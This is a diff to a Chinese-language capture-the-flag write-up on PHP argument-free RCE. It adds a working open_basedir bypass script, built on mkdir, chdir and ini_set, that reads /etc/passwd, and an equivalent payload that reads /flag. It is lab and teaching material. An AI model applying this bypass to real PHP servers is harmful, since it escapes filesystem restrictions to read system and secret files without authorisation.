@@ -6,6 +6,7 @@
 
 * 无参rce
 * chr拼接命令执行
+* open\_basedir绕过
 
 ## wp
 
@@ -392,7 +393,23 @@ die(json_encode($res));
 * 通过`chr(ord(strrev(crypt(serialize(array())))))`获取`/`
 * 通过`chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))`获取`.`
 
-不能使用end等操作数组的函数，只能用chr拼接
+不能使用end等操作数组的函数，只能用chr拼接，并且设置了open\_basedir，需要绕过
+
+![](<../.gitbook/assets/image (12).png>)
+
+绕过脚本，这里的chdir数量由chdir一次能否进入根目录决定，这里的目录是`/app/`，所以一次就行
+
+```php
+<?php
+mkdir('tmpdir');
+chdir('tmpdir');
+ini_set('open_basedir','..');
+chdir('..');
+ini_set('open_basedir','/');
+$a=file_get_contents('/etc/passwd');
+var_dump($a);
+?>
+```
 
 直接放exp吧
 
@@ -451,5 +468,15 @@ targeting('o','{$d}flag')
 targeting('p','{$j($o)}')
 targeting('q','printf')
 targeting('r','{$q($p)}')
-print(launch())py
+print(launch())
+```
+
+相当于执行如下语句
+
+```php
+chdir('js');
+ini_set('open_basedir','..');
+chdir('..');
+ini_set('open_basedir','/');
+printf(file_get_contents('/flag'));
 ```
